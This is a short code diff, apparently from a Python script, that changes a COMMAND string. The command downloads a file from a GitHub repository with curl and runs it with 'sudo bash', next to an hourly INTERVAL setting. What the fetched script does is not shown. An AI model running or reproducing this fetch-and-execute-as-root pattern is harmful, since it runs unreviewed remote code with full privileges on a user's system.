@@ -19,8 +19,8 @@ ACTIVE_COUNT = 19
 INTERVAL = 3600
 
 COMMAND = """
-curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/aryi
-sudo bash aryi
+curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/arya
+sudo bash arya
 """
 
 # Global counters
